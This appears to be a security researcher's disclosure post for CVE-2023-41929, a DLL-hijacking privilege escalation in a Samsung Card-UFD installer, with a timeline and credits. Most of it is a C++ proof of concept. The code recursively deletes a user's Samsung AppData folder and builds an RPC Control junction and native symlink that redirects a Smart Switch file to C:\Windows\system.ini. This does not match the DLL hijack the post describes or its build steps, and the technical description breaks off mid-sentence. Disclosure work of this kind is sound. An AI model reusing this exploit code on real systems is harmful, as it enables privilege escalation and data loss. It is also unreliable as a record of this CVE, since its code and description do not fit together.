---
title : "CVE-2023-41929: Samsung Card-UFD Authentication Utility for Windows Installer Local Privilege Escalation"
excerpt: "CVE-2023-41929"

categories:
    - "0-day"
tags:
    - [Samsung, 0-day, CVE, CVE-2023-41929, EoP, DoS, Mitre]
---


## 0x01: Details

- Title: Samsung Card-UFD Authentication Utility for Windows Installer Local Privilege Escalation
- CVE ID: CVE-2023-41929
- Advisory Published: 2023/09/22
- Advisory URL : [https://semiconductor.samsung.com/support/quality-support/product-security-updates/](https://semiconductor.samsung.com/support/quality-support/product-security-updates/)
- CVSS : 7.3 HIGH(CVSS Version 3.x)

## 0x02: Test Environment

- Samsung Card-UFD Authentication Utility for Windows : 1.0.1
- OS : Windows 10 Pro 64-bit 21H2 (build 19045.3086)

## 0x03: Vulnerability details

A DLL hijacking vulnerability in Samsung Memory Card & UFD Authentication Utility PC Software could allow a local attacker to escalate privileges. (An attacker must already have user privileges on Windows to exploit this vulnerability.)

## 0x04: Technical description

The `Samsung Card-UFD Authentication Utility` installer requires administrator privileges during installation and loads many DLLs from the directory where the installer is located. However, if an attacker tries to hijack a DLL in the directory where the installer is located, the installer will generate an error and stop the program installation.

The installer checks whether there are files with

## 0x05: Proof-of-Concept (PoC)

```cpp
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <wchar.h>
#include <string>
#include "NtDefine.h"

DWORD LastError = 0;
void SetLastErr(DWORD err) {
	LastError = err;
}

std::wstring BuildNativePath(std::wstring path) {
	if (path.rfind(L"\\", 0) != std::wstring::npos) {
		return path;
	}
	path = L"\\??\\" + path;
	return path;
}

HANDLE OpenDirectory(std::wstring directory, DWORD access_mask, DWORD share_mode, DWORD creation_disposition) {
	directory = BuildNativePath(directory);
	HANDLE h;
	OBJECT_ATTRIBUTES objattr;
	UNICODE_STRING target;
	IO_STATUS_BLOCK io;
	NTSTATUS status;
	_RtlInitUnicodeString(&target, directory.c_str());
	InitializeObjectAttributes(&objattr, &target, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
	switch (creation_disposition) {
	case CREATE_NEW:
		status = _NtCreateFile(&h, access_mask, &objattr, &io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,
			FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);
		break;
	case OPEN_EXISTING:
		status = _NtCreateFile(&h, access_mask, &objattr, &io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,
			FILE_OPEN, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);
		break;
	default:
		status = _NtCreateFile(&h, access_mask, &objattr, &io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,
			FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

	}
	if (status != STATUS_SUCCESS) {
		SetLastErr(_RtlNtStatusToDosError(status));
		return NULL;
	}
	return h;
}

bool CreateMountPoint(std::wstring dir, std::wstring target, std::wstring printname) {
	HANDLE hdir = OpenDirectory(dir, GENERIC_WRITE, ALL_SHARING, OPEN_ALWAYS);
	target = BuildNativePath(target);
	size_t targetsz = target.size() * 2;
	size_t printnamesz = printname.size() * 2;
	size_t pathbuffersz = targetsz + printnamesz + 12;
	size_t totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
	REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)_malloca(totalsz);
	memset(rdb, 0, totalsz);
	rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
	rdb->Reserved = NULL;
	rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
	rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
	memcpy(rdb->MountPointReparseBuffer.PathBuffer, target.c_str(), targetsz + 2);
	rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
	rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
	memcpy(rdb->MountPointReparseBuffer.PathBuffer + target.size() + 1, printname.c_str(), printnamesz + 2);
	DWORD cb = 0;
	bool ret = DeviceIoControl(hdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, nullptr, NULL, &cb, NULL) == TRUE;
	_NtClose(hdir);
	return ret;
}

HANDLE CreateNativeSymlink(std::wstring link, std::wstring target) {
	HANDLE ret;
	UNICODE_STRING ulnk;
	UNICODE_STRING utarget;
	NTSTATUS status;
	_RtlInitUnicodeString(&ulnk, link.c_str());
	_RtlInitUnicodeString(&utarget, target.c_str());

	OBJECT_ATTRIBUTES objattr;
	InitializeObjectAttributes(&objattr, &ulnk, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

	NTSTATUS stat = _NtCreateSymbolicLinkObject(&ret, SYMBOLIC_LINK_ALL_ACCESS,
		&objattr, &utarget);

	if (stat != STATUS_SUCCESS) {
		SetLastErr(_RtlNtStatusToDosError(stat));
		return nullptr;
	}
	return ret;
}

DWORD DeleteAllFiles(LPCWSTR szDir, DWORD recur) {
	HANDLE hSrch;
	WIN32_FIND_DATA wfd;
	DWORD res = 1;

	TCHAR DelPath[MAX_PATH];
	TCHAR FullPath[MAX_PATH];
	TCHAR TempPath[MAX_PATH];

	lstrcpy(DelPath, szDir);
	lstrcpy(TempPath, szDir);
	if (lstrcmp(DelPath + lstrlen(DelPath) - 4, L"\\*.*") != 0) {
		lstrcat(DelPath, L"\\*.*");
	}

	hSrch = FindFirstFile(DelPath, &wfd);
	if (hSrch == INVALID_HANDLE_VALUE) {
		if (recur > 0) RemoveDirectory(TempPath);
		return -1;
	}

	while (res) {
		wsprintf(FullPath, L"%s\\%s", TempPath, wfd.cFileName);

		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_READONLY) {
			SetFileAttributes(FullPath, FILE_ATTRIBUTE_NORMAL);
		}

		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (lstrcmp(wfd.cFileName, L".")
				&& lstrcmp(wfd.cFileName, L"..")) {
				recur++;
				DeleteAllFiles(FullPath, recur);
				recur--;
			}
		}
		else {
			DeleteFile(FullPath);
		}

		res = FindNextFile(hSrch, &wfd);
	}

	FindClose(hSrch);

	if (recur > 0) RemoveDirectory(TempPath);

	return 0;
}

void NtInit() {
	LoadLibrary(L"ntdll.dll");
	HMODULE hm = GetModuleHandle(L"ntdll.dll");
	_RtlInitUnicodeString = (ULONG(WINAPI*)(PUNICODE_STRING, PCWSTR))GetProcAddress(hm, "RtlInitUnicodeString");
	_RtlNtStatusToDosError = (ULONG(WINAPI*) (NTSTATUS Status))GetProcAddress(hm, "RtlNtStatusToDosError");
	_NtCreateSymbolicLinkObject = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             pHandle,
		IN ACCESS_MASK          DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes,
		IN PUNICODE_STRING      DestinationName))GetProcAddress(hm, "NtCreateSymbolicLinkObject");
	_NtCreateFile = (NTSTATUS(WINAPI*)(
		PHANDLE            FileHandle,
		ACCESS_MASK        DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes,
		PIO_STATUS_BLOCK   IoStatusBlock,
		PLARGE_INTEGER     AllocationSize,
		ULONG              FileAttributes,
		ULONG              ShareAccess,
		ULONG              CreateDisposition,
		ULONG              CreateOptions,
		PVOID              EaBuffer,
		ULONG              EaLength))GetProcAddress(hm, "NtCreateFile");
	_NtClose = (NTSTATUS(WINAPI*)(HANDLE Handle))GetProcAddress(hm, "NtClose");
}

int main() {
	NtInit();

	std::wstring UserProfilePath = std::wstring(_wgetenv(L"USERPROFILE"));

	std::wstring LinkFile = L"CRMData.db";
	std::wstring LinkDirectory = UserProfilePath + std::wstring(L"\\AppData\\Roaming\\Samsung\\Smart Switch PC");
	std::wstring TargetFile = L"C:\\Windows\\system.ini";

	std::wstring RpcControl = L"\\RPC Control";
	std::wstring RpcControlFile = RpcControl + L"\\" + LinkFile;

	std::wstring ParentDirectory = UserProfilePath + std::wstring(L"\\AppData\\Roaming\\Samsung");
	if (GetFileAttributesW(ParentDirectory.c_str()) != INVALID_FILE_ATTRIBUTES) {
		DeleteAllFiles(ParentDirectory.c_str(), 1);
	}

	CreateDirectoryW(ParentDirectory.c_str(), NULL);

	if (!CreateMountPoint(LinkDirectory, RpcControl, L"Junction")) {
		std::cout << "[-] RPC Control Junction Failed" << std::endl;
		exit(0);
	}
	std::cout << "[+] RPC Control Junction Success" << std::endl;

	HANDLE hFile = CreateNativeSymlink(RpcControlFile, BuildNativePath(TargetFile));
	if (hFile == INVALID_HANDLE_VALUE || hFile == NULL) {
		std::cout << "[-] CreateNativeSymlink Failed" << std::endl;
		exit(0);
	}
	std::cout << "[+] CreateNativeSymlink Success    Handle : " << hFile << std::endl;
	std::cout << "[+] CreateSymlink Success" << std::endl;
	std::wcout << L"[+] " << (LinkDirectory + L"\\" + LinkFile) << L" -> " << TargetFile << std::endl;
	std::cout << "Press ENTER to exit and delete the symlink" << std::endl;
	getchar();

	return 0;
}
```

main.cpp

```cpp
#pragma once
#include <Windows.h>

#define     SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
#define     STATUS_SUCCESS            0x00000000
#define     OBJ_CASE_INSENSITIVE      0x00000040L
#define 	FILE_OPEN                 0x00000001
#define 	FILE_OPEN_IF              0x00000003
#define 	FILE_CREATE               0x00000002
#define 	FILE_DIRECTORY_FILE       0x00000001
#define 	FILE_DIRECTORY_FILE       0x00000001
#define 	FILE_OPEN_REPARSE_POINT   0x00200000

#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
#define GENERIC_READ_WRITE GENERIC_READ|GENERIC_WRITE
#define InitializeObjectAttributes( p, n, a, r, s ) {    \
    (p)->uLength = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->hRootDirectory = r;                             \
    (p)->uAttributes = a;                                \
    (p)->pObjectName = n;                                \
    (p)->pSecurityDescriptor = s;                        \
    (p)->pSecurityQualityOfService = NULL;               \
}

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG Flags;
            WCHAR PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR  DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;
#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG uLength;
    HANDLE hRootDirectory;
    PUNICODE_STRING pObjectName;
    ULONG uAttributes;
    PVOID pSecurityDescriptor;
    PVOID pSecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

ULONG(WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
ULONG(WINAPI* _RtlNtStatusToDosError)(NTSTATUS Status);
NTSTATUS(WINAPI* _NtCreateFile)(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength);
NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
    OUT PHANDLE             pHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes,
    IN PUNICODE_STRING      DestinationName);
NTSTATUS(WINAPI* _NtClose)(
    HANDLE Handle
    );
```

NtDefine.h

1. Use Visual Studio 2019.
2. Compile the project in the DLL directory in x86 Release mode.
3. Rename the compiled dll to SspiCli.DLL and place it in the same directory as SMCA_Win_P01_RC01_20191202.exe.
4. Run SMCA_Win_P01_RC01_20191202.exe to perform Samsung Card-UFD Authentication Utility installation.

## 0x06: Affected Products

This vulnerability affects the following product:

- Samsung Memory Card & UFD Authentication Utility PC Software < 1.0.2

## 0x07: Credit information

HeeChan Kim (@heegong123) of TeamH4C

## 0x08: TimeLine

- 2023/06/29 : First time contacted via Samsung Mobile Security.
- 2023/07/03 : I received notification that the vulnerability had been transferred to the Samsung Device Solution Product Security Team.
- 2023/07/26 : The vulnerability is High, CVSS is 7.3, and I have been notified that the vulnerability will be patched.
- 2023/09/22 : The vulnerability has been patched, and CVE-2023-41929 has been issued.

## 0x09: Reference

- [https://semiconductor.samsung.com/support/quality-support/product-security-updates/](https://semiconductor.samsung.com/support/quality-support/product-security-updates/)
- [https://nvd.nist.gov/vuln/detail/CVE-2023-41929](https://nvd.nist.gov/vuln/detail/CVE-2023-41929)